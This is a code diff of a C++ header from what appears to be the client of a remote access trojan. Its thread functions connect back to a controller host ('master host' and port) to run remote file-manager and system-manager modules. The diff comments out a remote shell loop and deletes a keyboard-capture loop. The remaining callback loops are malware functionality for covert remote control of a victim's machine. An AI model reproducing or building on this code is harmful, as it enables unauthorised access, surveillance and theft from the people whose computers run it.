@@ -1,14 +1,13 @@
 #pragma once
 #include "KernelManager.h"
 #include "FileManager.h"
-//#include "ScreenManager.h"
-#include "ShellManager.h"
-//#include "VideoManager.h"
-//#include "AudioManager.h"
+
+//#include "ShellManager.h"
+
 #include "SystemManager.h"
-//#include "KeyboardManager.h"
+
 #include "until.h"
-//#include "install.h"
+
 #include <wininet.h>
 
 extern bool g_bSignalHook;
@@ -24,33 +23,20 @@ DWORD WINAPI Loop_FileManager(SOCKET sRemote)
 	return 0;
 }
 
-DWORD WINAPI Loop_ShellManager(SOCKET sRemote)
-{
-	CClientSocket	socketClient;
-	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
-		return -1;
+// DWORD WINAPI Loop_ShellManager(SOCKET sRemote)
+// {
+// 	CClientSocket	socketClient;
+// 	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
+// 		return -1;
+// 
+// 	CShellManager	manager(&socketClient);
+// 
+// 	socketClient.run_event_loop();
+// 
+// 	return 0;
+// }
 
-	CShellManager	manager(&socketClient);
 
-	socketClient.run_event_loop();
-
-	return 0;
-}
-
-
-
-DWORD WINAPI Loop_KeyboardManager(SOCKET sRemote)
-{	
-	CClientSocket	socketClient;
-	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
-		return -1;
-
-	CKeyboardManager	manager(&socketClient);
-
-	socketClient.run_event_loop();
-
-	return 0;
-}
 
 DWORD WINAPI Loop_SystemManager(SOCKET sRemote)
 {	
